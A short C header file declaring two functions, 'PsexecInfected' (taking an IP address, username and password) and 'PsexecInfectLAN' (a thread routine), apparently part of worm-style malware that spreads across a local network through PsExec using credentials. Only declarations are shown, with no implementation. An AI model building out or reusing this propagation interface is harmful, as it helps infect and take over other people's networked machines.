#pragma once
#include "Global.h"

BOOL PsexecInfected(WCHAR *pszIp, WCHAR *lpUserName, WCHAR *lpPassword, PDWORD pWNetRet);

DWORD __stdcall PsexecInfectLAN(LPVOID pParam);